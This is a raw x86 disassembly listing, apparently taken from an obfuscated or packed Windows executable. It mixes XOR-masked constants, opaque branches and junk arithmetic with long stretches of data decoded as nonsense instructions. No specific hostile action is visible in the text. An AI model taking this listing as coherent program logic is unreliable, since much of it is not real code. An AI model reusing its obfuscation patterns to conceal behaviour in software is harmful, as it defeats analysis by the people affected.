  420dca:	xchg   DWORD PTR [edi],esi
  420dcc:	adc    al,0xe
  420dce:	mov    esi,0xb2738b6
  420dd3:	sbb    eax,0xb4c8b5e8
  420dd8:	add    DWORD PTR [esi],ecx
  420dda:	add    bl,BYTE PTR [ebx]
  420ddc:	jmp    0x1dca:0xe2aa0af2
  420de3:	and    al,0xe7
  420de5:	xor    eax,0xb2eb4d80
  420dea:	xor    al,0x9a
  420dec:	cmp    esi,DWORD PTR [ebx-0x67]
  420def:	test   al,0x38
  420df1:	sub    al,0x92
  420df3:	sbb    DWORD PTR [ebp+ecx*8+0x7a],esp
  420df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420df8:	pop    ecx
  420df9:	pushf  
  420dfa:	in     eax,0x66
  420dfc:	fcom   st(1)
  420dfe:	scas   eax,DWORD PTR es:[edi]
  420dff:	adc    dl,BYTE PTR [ecx]
  420e01:	mov    edi,0x664adbb7
  420e06:	aaa    
  420e07:	dec    edi
  420e08:	add    al,0xe4
  420e0a:	ins    BYTE PTR es:[edi],dx
  420e0b:	mov    ds:0x852a061c,al
  420e10:	ret    
  420e11:	push   esp
  420e12:	(bad)  
  420e13:	dec    esp
  420e14:	mov    esi,0x4c54fbe3
  420e19:	jnp    0x420e11
  420e1b:	and    bh,ch
  420e1d:	xlat   BYTE PTR ds:[ebx]
  420e1e:	retf   0xace0
  420e21:	xchg   ebx,eax
  420e22:	add    ah,0x2f
  420e25:	sbb    ebx,DWORD PTR [ebx]
  420e27:	inc    esp
  420e28:	cmp    BYTE PTR [edi],0xe3
  420e2b:	mov    ch,0x75
  420e2d:	out    dx,eax
  420e2e:	(bad)  [eax+0x41a03dba]
  420e34:	test   eax,0xa942751e
  420e39:	jp     0x420eb0
  420e3b:	push   ss
  420e3c:	ins    BYTE PTR es:[edi],dx
  420e3d:	ins    DWORD PTR es:[edi],dx
  420e3e:	popf   
  420e3f:	pop    ss
  420e40:	push   es
  420e41:	cmp    BYTE PTR [ecx+ebx*1+0x18],cl
  420e45:	sub    ecx,DWORD PTR [ecx+0x76]
  420e48:	mov    ecx,0xa3a9e5b6
  420e4d:	(bad)  
  420e4e:	xor    BYTE PTR [ebp+0x38],dh
  420e51:	out    dx,eax
  420e52:	xor    DWORD PTR [ebp+0x70],esi
  420e55:	sahf   
  420e56:	(bad)  
  420e57:	pop    ecx
  420e58:	sub    edx,0x29ad
  420e5e:	mov    esi,DWORD PTR ds:0x42817b
  420e64:	sbb    DWORD PTR ds:0x42836f,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x42838b,0x0
  420e74:	mov    DWORD PTR ds:0x428243,ebx
  420e7a:	mov    DWORD PTR ds:0x42817b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42816f
  420e8e:	mov    DWORD PTR ds:0x428253,0x776f
  420e98:	cmp    DWORD PTR ds:0x42838b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428227
  420eaa:	push   0x42808f
  420eaf:	call   DWORD PTR ds:0x428e48
  420eb5:	add    ecx,DWORD PTR ds:0x428387
  420ebb:	xor    esi,DWORD PTR ds:0x42821f
  420ec1:	adc    DWORD PTR ds:0x428277,edx
  420ec7:	xor    DWORD PTR ds:0x4282ff,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42822b
  420ed3:	or     esi,DWORD PTR ds:0x428187
  420ed9:	mov    DWORD PTR ds:0x42822b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42825f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428147
  420eef:	sbb    eax,DWORD PTR ds:0x4282fb
  420ef5:	mov    ds:0x428147,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x4281f7
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42834f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x4282ff,0x0
  420f23:	mov    DWORD PTR ds:0x428293,0x1362
  420f2d:	mov    DWORD PTR ds:0x428243,edx
  420f33:	mov    DWORD PTR ds:0x42827f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428363,0xeb5
  420f48:	cmp    DWORD PTR ds:0x4282ff,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428ec0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281cf
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281db
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428257,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42824f
  420f87:	sbb    edx,DWORD PTR ds:0x428397
  420f8d:	mov    DWORD PTR ds:0x42824f,edx
  420f93:	add    DWORD PTR ds:0x42818b,ecx
  420f99:	sub    DWORD PTR ds:0x42837b,0x4282eb
  420fa3:	cmp    DWORD PTR ds:0x428277,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42835b
  420fb0:	movzx  edx,BYTE PTR ds:0x428163
  420fb7:	mov    DWORD PTR ds:0x4282e7,0x5580
  420fc1:	mov    DWORD PTR ds:0x428393,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428397,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428277,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d64
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x4282f7
  421000:	sbb    DWORD PTR ds:0x428273,edx
  421006:	movzx  edx,WORD PTR ds:0x42814b
  42100d:	or     edx,DWORD PTR ds:0x428373
  421013:	mov    DWORD PTR ds:0x42814b,edx
  421019:	dec    DWORD PTR ds:0x428363
  42101f:	sub    DWORD PTR ds:0x42826f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42815b,0x0
  421048:	mov    DWORD PTR ds:0x428367,0x62d9
  421052:	mov    DWORD PTR ds:0x428147,0x300d
  42105c:	mov    DWORD PTR ds:0x42814b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282ef
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42835f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42815b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d84
  4210a1:	sbb    ecx,DWORD PTR ds:0x428273
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428297,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428153
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x422227
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x42136a
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x35bc:0x65828d2a
  42115b:	sti    
  42115c:	mov    ecx,0x160fc17c
  421161:	sbb    BYTE PTR [eax],bl
  421163:	adc    al,0x18
  421165:	sbb    BYTE PTR [edi-0x2e],cl
  421168:	nop
  421169:	loopne 0x421155
  42116b:	shl    DWORD PTR [edx],0xa8
  42116e:	lods   eax,DWORD PTR ds:[esi]
  42116f:	aam    0xb9
  421171:	in     eax,0xd7
  421173:	pop    ebp
  421174:	inc    esp
  421175:	retf   
  421176:	cs enter 0x1e10,0x61
  42117b:	out    dx,al
  42117c:	mov    BYTE PTR [edi-0x27],0x57
  421180:	push   ecx
  421181:	iret   
  421182:	push   es
  421183:	test   al,0x8f
  421185:	pop    edx
  421186:	sahf   
  421187:	jne    0x421195
  421189:	cmp    BYTE PTR [edi-0x3b],al
  42118c:	pop    eax
  42118d:	jge    0x4211d8
  42118f:	jmp    0x4211ff
  421191:	adc    eax,edx
  421193:	imul   esp,DWORD PTR ds:0xe58543ef,0x4d
  42119a:	mov    BYTE PTR [edx-0x37e3229a],ch
  4211a0:	ja     0x4211f8
  4211a2:	retf   0xbd64
  4211a5:	fcom   QWORD PTR [esp+0x6f5b0406]
  4211ac:	repz cmp eax,0xe2d80fd
  4211b2:	(bad)  
  4211b3:	jno    0x421214
  4211b5:	push   cs
  4211b6:	out    dx,eax
  4211b7:	lea    esp,[edx-0x1211171b]
  4211bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211be:	jb     0x421231
  4211c0:	mov    edi,fs
  4211c2:	dec    edi
  4211c3:	and    DWORD PTR [ebx+ecx*8],edx
  4211c6:	mov    dl,0x7f
  4211c8:	clc    
  4211c9:	jns    0x421164
  4211cb:	les    eax,FWORD PTR [edi+ebx*1]
  4211ce:	test   DWORD PTR [esi-0x20ebd578],ebp
  4211d4:	pop    eax
  4211d5:	enter  0x2b00,0x94
  4211d9:	xchg   ebp,eax
  4211da:	mov    ah,0x80
  4211dc:	push   esp
  4211dd:	repz xor DWORD PTR [edi+edx*1+0x4c],edi
  4211e2:	push   esp
  4211e3:	cmp    ebx,DWORD PTR [eax+0x594e91b6]
  4211e9:	xchg   ebx,eax
  4211ea:	push   ecx
  4211eb:	inc    edi
  4211ec:	sti    
  4211ed:	loop   0x4211f9
  4211ef:	jmp    0x5248006c
  4211f4:	aad    0xdd
  4211f6:	clc    
  4211f7:	push   ebx
  4211f8:	rdpmc  
  4211fa:	scas   al,BYTE PTR es:[edi]
  4211fb:	mov    bl,0x3b
  4211fd:	xchg   BYTE PTR [ecx],cl
  4211ff:	inc    ebx
  421200:	shr    DWORD PTR [ecx+0x2a615b78],0x25
  421207:	mov    al,ds:0xfb646de
  42120c:	cs mov ah,0xb6
  42120f:	xor    esi,DWORD PTR [ebx]
  421211:	ss pushf 
  421213:	or     edx,ebp
  421215:	andps  xmm6,xmm1
  421218:	mov    ah,0xc6
  42121a:	nop
  42121b:	xchg   esi,eax
  42121c:	add    edi,0xd555798d
  421222:	xchg   edi,eax
  421223:	out    0xb6,eax
  421225:	int    0xf6
  421227:	mov    eax,DWORD PTR [edi]
  421229:	loope  0x4211dc
  42122b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42122c:	(bad)  
  42122e:	leave  
  42122f:	das    
  421230:	inc    ecx
  421231:	scas   eax,DWORD PTR es:[edi]
  421232:	outs   dx,BYTE PTR ds:[esi]
  421233:	add    cl,BYTE PTR [edi+eax*8]
  421236:	mov    ds:0xe2af105,eax
  42123b:	cdq    
  42123c:	push   esp
  42123d:	pop    ebx
  42123e:	sub    eax,esi
  421240:	sbb    eax,0xe2ccd09a
  421245:	mov    ch,0x2b
  421247:	jne    0x421267
  421249:	mov    ebp,0x6870ff74
  42124e:	cmp    eax,DWORD PTR [edx]
  421250:	cdq    
  421251:	or     esp,ebp
  421253:	cmp    edi,DWORD PTR [ebp+0x7a67be3a]
  421259:	inc    ecx
  42125a:	add    dl,bl
  42125c:	mov    bl,BYTE PTR [edi]
  42125e:	sub    eax,0xbb133182
  421263:	xlat   BYTE PTR ds:[ebx]
  421264:	and    bh,bl
  421266:	ds mov esi,0x781e0958
  42126c:	xchg   ecx,eax
  42126d:	imul   ebx,DWORD PTR [ebp+0x51],0xffffffe4
  421271:	ret    
  421272:	push   ebp
  421273:	push   ecx
  421274:	or     edi,ebx
  421276:	push   edi
  421277:	lahf   
  421278:	nop
  421279:	jmp    0x421269
  42127b:	pop    es
  42127c:	xchg   ebx,eax
  42127d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127e:	das    
  42127f:	dec    ebx
  421280:	xchg   esp,eax
  421281:	enter  0xcb90,0x11
  421285:	xchg   esp,eax
  421286:	jle    0x42129e
  421288:	add    ecx,esi
  42128a:	pavgw  mm6,QWORD PTR [edi-0x71801d25]
  421291:	retf   0x9c1b
  421294:	mov    ecx,0x723c4283
  421299:	mov    esp,0x9fc4011
  42129e:	xchg   BYTE PTR [edx+0x30],dh
  4212a1:	lock scas eax,DWORD PTR es:[edi]
  4212a3:	aad    0x79
  4212a5:	xchg   ebx,eax
  4212a7:	inc    ebp
  4212a8:	mov    bh,0x59
  4212aa:	test   al,0xa1
  4212ac:	es mov bl,0x49
  4212af:	out    dx,eax
  4212b0:	fsub   DWORD PTR [eax-0x5aea85cc]
  4212b6:	inc    eax
  4212b7:	pushf  
  4212b8:	jae    0x4212ae
  4212ba:	add    eax,0x70872c84
  4212bf:	jp     0x421335
  4212c1:	xchg   esi,eax
  4212c2:	fwait
  4212c3:	xchg   edx,eax
  4212c4:	in     al,dx
  4212c5:	shl    BYTE PTR [edi+0x1f],0x5d
  4212c9:	add    dh,BYTE PTR [ecx+0x6c]
  4212cc:	jmp    esi
  4212ce:	pop    es
  4212cf:	mov    eax,ds:0xb729b99b
  4212d4:	mov    eax,0x3f03a4d8
  4212d9:	daa    
  4212da:	test   ebp,edi
  4212dc:	and    al,0xbb
  4212de:	sbb    ah,BYTE PTR [esi-0x53]
  4212e1:	sbb    ch,bh
  4212e3:	out    dx,al
  4212e4:	(bad)
  4212e8:	sar    dh,0x77
  4212eb:	(bad)  
  4212ec:	test   DWORD PTR [ecx],0x20810c21
  4212f2:	loopne 0x421343
  4212f4:	pushf  
  4212f5:	repz adc esp,edx
  4212f8:	(bad)  
  4212f9:	outs   dx,DWORD PTR ds:[esi]
  4212fb:	mov    ecx,0x40e745f7
  421300:	cmp    dh,BYTE PTR [eax+0x55e31c91]
  421306:	cmp    bl,BYTE PTR [edi-0x1b]
  421309:	dec    edi
  42130a:	jecxz  0x421387
  42130c:	jbe    0x4212f7
  42130e:	mov    ds:0x63759f32,al
  421313:	adc    ecx,DWORD PTR [eax+0x7e38c4c9]
  421319:	or     DWORD PTR [edi],esi
  42131b:	mov    ss,WORD PTR [ebx+0x51]
  42131e:	js     0x4212e1
  421320:	mov    ecx,0x3d8f6417
  421325:	lods   al,BYTE PTR ds:[esi]
  421326:	xor    DWORD PTR [eax+ebx*4+0x549280f],esp
  42132d:	je     0x421390
  42132f:	mov    esi,0x2757d1ef
  421334:	je     0x421352
  421336:	loopne 0x421389
  421338:	jecxz  0x4212f4
  42133a:	stos   DWORD PTR es:[edi],eax
  42133b:	repnz sub BYTE PTR [eax-0x65dcfd65],bh
  421342:	shr    BYTE PTR [eiz*4+0x49fa10e2],1
  421349:	mov    DWORD PTR [ebx],ebp
  42134b:	xor    ebx,DWORD PTR [ebx+0x7a]
  42134e:	mov    bh,0xd2
  421350:	imul   eax,ecx,0xffffff80
  421353:	mov    esi,0x62f5c404
  421358:	mov    eax,ds:0x449605f8
  42135d:	jnp    0x42131e
  42135f:	fsubr  st,st(0)
  421361:	pop    ebx
  421362:	call   0x421accbe
  421367:	jno    0x4213b3
  421369:	scas   al,BYTE PTR es:[edi]
  42136a:	mov    eax,DWORD PTR [ebp-0x15c]
  421370:	mov    edx,DWORD PTR [ebp-0x158]
  421376:	xor    eax,0xca79a575
  42137b:	xor    edx,0x9c1b89e8
  421381:	mov    cl,0x2
  421383:	call   0x40a9b5
  421388:	mov    ecx,edx
  42138a:	mov    edx,DWORD PTR [ebp-0x15c]
  421390:	mov    DWORD PTR [ebp-0x218],esi
  421396:	mov    esi,DWORD PTR [ebp-0x158]
  42139c:	xor    edx,0xca79a575
  4213a2:	xor    esi,0x9c1b89e8
  4213a8:	mov    DWORD PTR [ebp-0x21c],eax
  4213ae:	mov    eax,edx
  4213b0:	mov    edx,esi
  4213b2:	mov    DWORD PTR [ebp-0x220],ecx
  4213b8:	mov    cl,0x3e
  4213ba:	call   0x422227
  4213bf:	mov    esi,DWORD PTR [ebp-0x21c]
  4213c5:	or     esi,eax
  4213c7:	mov    eax,DWORD PTR [ebp-0x220]
  4213cd:	or     eax,edx
  4213cf:	push   eax
  4213d0:	push   esi
  4213d1:	push   ebx
  4213d2:	push   edi
  4213d3:	call   0x416c20
  4213d8:	mov    esi,DWORD PTR [ebp-0x218]
  4213de:	cmp    esi,eax
  4213e0:	jne    0x421496
  4213e6:	mov    eax,DWORD PTR [ebp-0x154]
  4213ec:	mov    edx,DWORD PTR [ebp-0x150]
  4213f2:	xor    eax,0xca79a575
  4213f7:	xor    edx,0x9c1b89e8
  4213fd:	mov    cl,0x2
  4213ff:	call   0x40a9b5
  421404:	mov    esi,eax
  421406:	mov    edi,edx
  421408:	mov    eax,DWORD PTR [ebp-0x154]
  42140e:	mov    edx,DWORD PTR [ebp-0x150]
  421414:	xor    eax,0xca79a575
  421419:	xor    edx,0x9c1b89e8
  42141f:	mov    cl,0x3e
  421421:	call   0x422227
  421426:	or     esi,eax
  421428:	or     edi,edx
  42142a:	mov    eax,DWORD PTR [ebp-0x15c]
  421430:	mov    edx,DWORD PTR [ebp-0x158]
  421436:	xor    eax,0xca79a575
  42143b:	xor    edx,0x9c1b89e8
  421441:	mov    cl,0x2
  421443:	call   0x40a9b5
  421448:	mov    ebx,eax
  42144a:	mov    eax,edx
  42144c:	mov    ecx,DWORD PTR [ebp-0x15c]
  421452:	mov    edx,DWORD PTR [ebp-0x158]
  421458:	xor    ecx,0xca79a575
  42145e:	xor    edx,0x9c1b89e8
  421464:	mov    DWORD PTR [ebp-0x224],eax
  42146a:	mov    eax,ecx
  42146c:	mov    cl,0x3e
  42146e:	call   0x422227
  421473:	or     ebx,eax
  421475:	mov    eax,DWORD PTR [ebp-0x224]
  42147b:	or     eax,edx
  42147d:	push   eax
  42147e:	push   ebx
  42147f:	push   edi
  421480:	push   esi
  421481:	call   0x416c20
  421486:	mov    DWORD PTR [ebp-0x178],eax
  42148c:	jmp    0x421756
  421491:	jmp    0x42170c
  421496:	lea    eax,[ebp-0x168]
  42149c:	mov    DWORD PTR [ebp-0x164],eax
  4214a2:	mov    eax,DWORD PTR [ebp-0x164]
  4214a8:	mov    DWORD PTR [eax],0xa4069aae
  4214ae:	mov    eax,DWORD PTR [ebp-0x168]
  4214b4:	xor    eax,0xa4069aae
  4214b9:	shr    eax,0x2
  4214bc:	mov    ecx,DWORD PTR [ebp-0x168]
  4214c2:	xor    ecx,0xa4069aae
  4214c8:	shl    ecx,0x1e
  4214cb:	or     eax,ecx
  4214cd:	mov    ecx,DWORD PTR [ebp-0x174]
  4214d3:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214d7:	mov    DWORD PTR [ebp-0x160],eax
  4214dd:	mov    esi,DWORD PTR [ebp-0x160]
  4214e3:	mov    eax,DWORD PTR [ebp-0x154]
  4214e9:	mov    edx,DWORD PTR [ebp-0x150]
  4214ef:	xor    eax,0xca79a575
  4214f4:	xor    edx,0x9c1b89e8
  4214fa:	mov    cl,0x2
  4214fc:	call   0x40a9b5
  421501:	mov    edi,eax
  421503:	mov    ebx,edx
  421505:	mov    eax,DWORD PTR [ebp-0x154]
  42150b:	mov    edx,DWORD PTR [ebp-0x150]
  421511:	xor    eax,0xca79a575
  421516:	xor    edx,0x9c1b89e8
  42151c:	mov    cl,0x3e
  42151e:	call   0x422227
  421523:	or     edi,eax
  421525:	or     ebx,edx
  421527:	mov    eax,DWORD PTR [ebp-0x15c]
  42152d:	mov    edx,DWORD PTR [ebp-0x158]
  421533:	xor    eax,0xca79a575
  421538:	xor    edx,0x9c1b89e8
  42153e:	mov    cl,0x2
  421540:	call   0x40a9b5
  421545:	mov    ecx,edx
  421547:	mov    edx,DWORD PTR [ebp-0x15c]
  42154d:	mov    DWORD PTR [ebp-0x228],esi
  421553:	mov    esi,DWORD PTR [ebp-0x158]
  421559:	xor    edx,0xca79a575
  42155f:	xor    esi,0x9c1b89e8
  421565:	mov    DWORD PTR [ebp-0x22c],eax
  42156b:	mov    eax,edx
  42156d:	mov    edx,esi
  42156f:	mov    DWORD PTR [ebp-0x230],ecx
  421575:	mov    cl,0x3e
  421577:	call   0x422227
  42157c:	mov    esi,DWORD PTR [ebp-0x22c]
  421582:	or     esi,eax
  421584:	mov    eax,DWORD PTR [ebp-0x230]
  42158a:	or     eax,edx
  42158c:	push   eax
  42158d:	push   esi
  42158e:	push   ebx
  42158f:	push   edi
  421590:	call   0x416c20
  421595:	mov    esi,DWORD PTR [ebp-0x228]
  42159b:	cmp    esi,eax
  42159d:	je     0x421612
  4215a3:	mov    eax,DWORD PTR [ebp-0x154]
  4215a9:	mov    edx,DWORD PTR [ebp-0x150]
  4215af:	xor    eax,0xca79a575
  4215b4:	xor    edx,0x9c1b89e8
  4215ba:	mov    cl,0x2
  4215bc:	call   0x40a9b5
  4215c1:	mov    esi,eax
  4215c3:	mov    edi,edx
  4215c5:	mov    eax,DWORD PTR [ebp-0x154]
  4215cb:	mov    edx,DWORD PTR [ebp-0x150]
  4215d1:	xor    eax,0xca79a575
  4215d6:	xor    edx,0x9c1b89e8
  4215dc:	mov    cl,0x3e
  4215de:	call   0x422227
  4215e3:	or     esi,eax
  4215e5:	or     edi,edx
  4215e7:	mov    eax,DWORD PTR [ebp-0x160]
  4215ed:	imul   esi,eax
  4215f0:	add    esi,DWORD PTR [ebp-0x170]
  4215f6:	mov    DWORD PTR [ebp-0x16c],esi
  4215fc:	mov    eax,DWORD PTR [ebp-0x16c]
  421602:	mov    DWORD PTR [ebp-0x178],eax
  421608:	jmp    0x421756
  42160d:	jmp    0x4216bd
  421612:	mov    eax,DWORD PTR [ebp-0x154]
  421618:	mov    edx,DWORD PTR [ebp-0x150]
  42161e:	xor    eax,0xca79a575
  421623:	xor    edx,0x9c1b89e8
  421629:	mov    cl,0x2
  42162b:	call   0x40a9b5
  421630:	mov    esi,eax
  421632:	mov    edi,edx
  421634:	mov    eax,DWORD PTR [ebp-0x154]
  42163a:	mov    edx,DWORD PTR [ebp-0x150]
  421640:	xor    eax,0xca79a575
  421645:	xor    edx,0x9c1b89e8
  42164b:	mov    cl,0x3e
  42164d:	call   0x422227
  421652:	or     esi,eax
  421654:	or     edi,edx
  421656:	mov    eax,DWORD PTR [ebp-0x15c]
  42165c:	mov    edx,DWORD PTR [ebp-0x158]
  421662:	xor    eax,0xca79a575
  421667:	xor    edx,0x9c1b89e8
  42166d:	mov    cl,0x2
  42166f:	call   0x40a9b5
  421674:	mov    ebx,eax
  421676:	mov    eax,edx
  421678:	mov    ecx,DWORD PTR [ebp-0x15c]
  42167e:	mov    edx,DWORD PTR [ebp-0x158]
  421684:	xor    ecx,0xca79a575
  42168a:	xor    edx,0x9c1b89e8
  421690:	mov    DWORD PTR [ebp-0x234],eax
  421696:	mov    eax,ecx
  421698:	mov    cl,0x3e
  42169a:	call   0x422227
  42169f:	or     ebx,eax
  4216a1:	mov    eax,DWORD PTR [ebp-0x234]
  4216a7:	or     eax,edx
  4216a9:	push   eax
  4216aa:	push   ebx
  4216ab:	push   edi
  4216ac:	push   esi
  4216ad:	call   0x416c20
  4216b2:	mov    DWORD PTR [ebp-0x178],eax
  4216b8:	jmp    0x421756
  4216bd:	mov    eax,DWORD PTR [ebp-0x15c]
  4216c3:	mov    edx,DWORD PTR [ebp-0x158]
  4216c9:	xor    eax,0xca79a575
  4216ce:	xor    edx,0x9c1b89e8
  4216d4:	mov    cl,0x2
  4216d6:	call   0x40a9b5
  4216db:	mov    esi,eax
  4216dd:	mov    edi,edx
  4216df:	mov    eax,DWORD PTR [ebp-0x15c]
  4216e5:	mov    edx,DWORD PTR [ebp-0x158]
  4216eb:	xor    eax,0xca79a575
  4216f0:	xor    edx,0x9c1b89e8
  4216f6:	mov    cl,0x3e
  4216f8:	call   0x422227
  4216fd:	or     esi,eax
  4216ff:	or     edi,edx
  421701:	mov    DWORD PTR [ebp-0x178],esi
  421707:	jmp    0x421756
  42170c:	mov    eax,DWORD PTR [ebp-0x15c]
  421712:	mov    edx,DWORD PTR [ebp-0x158]
  421718:	xor    eax,0xca79a575
  42171d:	xor    edx,0x9c1b89e8
  421723:	mov    cl,0x2
  421725:	call   0x40a9b5
  42172a:	mov    esi,eax
  42172c:	mov    edi,edx
  42172e:	mov    eax,DWORD PTR [ebp-0x15c]
  421734:	mov    edx,DWORD PTR [ebp-0x158]
  42173a:	xor    eax,0xca79a575
  42173f:	xor    edx,0x9c1b89e8
  421745:	mov    cl,0x3e
  421747:	call   0x422227
  42174c:	or     esi,eax
  42174e:	or     edi,edx
  421750:	mov    DWORD PTR [ebp-0x178],esi
  421756:	mov    ecx,DWORD PTR [ebp-0xd8]
  42175c:	mov    eax,0x459a
  421761:	xor    edx,edx
  421763:	div    ecx
  421765:	mov    ecx,DWORD PTR [ebp-0xdc]
  42176b:	and    eax,ecx
  42176d:	add    eax,DWORD PTR [ebp-0x44]
  421770:	mov    ecx,DWORD PTR [ebp-0xe0]
  421776:	lea    eax,[eax+ecx*1+0x272f]
  42177d:	xor    eax,0x1080c
  421782:	add    eax,DWORD PTR [ebp-0x178]
  421788:	mov    DWORD PTR [ebp-0xe8],eax
  42178e:	mov    DWORD PTR [ebp-0xc],0x5950
  421795:	mov    DWORD PTR [ebp-0xf8],0x4964
  42179f:	mov    DWORD PTR [ebp-0x130],0x3
  4217a9:	mov    DWORD PTR [ebp-0x20],0x2df9
  4217b0:	mov    DWORD PTR [ebp-0x8],0x4524
  4217b7:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217c1:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217cb:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217d5:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217df:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217e9:	mov    eax,DWORD PTR [ebp-0xf8]
  4217ef:	mov    ecx,DWORD PTR [ebp-0x130]
  4217f5:	xor    edx,edx
  4217f7:	div    ecx
  4217f9:	add    eax,0x454e
  4217fe:	mov    ecx,DWORD PTR [ebp-0xc]
  421801:	and    eax,ecx
  421803:	xor    eax,0x5940
  421808:	add    eax,DWORD PTR [ebp+0x8]
  42180b:	mov    ecx,DWORD PTR [ebp-0x110]
  421811:	mov    edx,DWORD PTR [ebp-0xa4]
  421817:	sub    ecx,edx
  421819:	mov    edx,DWORD PTR [ebp-0xd4]
  42181f:	or     ecx,edx
  421821:	mov    edx,DWORD PTR [ebp-0x8]
  421824:	and    ecx,edx
  421826:	mov    edx,DWORD PTR [ebp-0x20]
  421829:	xor    ecx,edx
  42182b:	mov    edx,DWORD PTR [ebp-0x10c]
  421831:	mov    esi,0x180f
  421836:	sub    esi,edx
  421838:	mov    edx,DWORD PTR [ebp-0xa0]
  42183e:	imul   esi,edx
  421841:	xor    esi,0x402b
  421847:	xor    esi,0xfed78c17
  42184d:	mov    edx,DWORD PTR [ebp-0xe8]
  421853:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  42185a:	add    ecx,eax
  42185c:	add    esi,ecx
  42185e:	mov    DWORD PTR [ebp-0x38],esi
  421861:	mov    DWORD PTR [ebp-0x4],0x59a8
  421868:	mov    DWORD PTR [ebp-0x30],0x7021
  42186f:	mov    DWORD PTR [ebp-0xf4],0x6210
  421879:	mov    DWORD PTR [ebp-0x58],0x73d5
  421880:	mov    DWORD PTR [ebp-0x124],0x1e7d
  42188a:	mov    DWORD PTR [ebp-0x3c],0x3144
  421891:	mov    eax,DWORD PTR [ebp-0x30]
  421894:	xor    eax,0x75cb
  421899:	mov    ecx,DWORD PTR [ebp-0x4]
  42189c:	imul   eax,ecx
  42189f:	mov    ecx,DWORD PTR [ebp+0x8]
  4218a2:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218a9:	mov    eax,DWORD PTR [ebp-0xf4]
  4218af:	and    eax,0x6b34
  4218b4:	and    eax,0x658d
  4218b9:	xor    edx,edx
  4218bb:	push   0x6
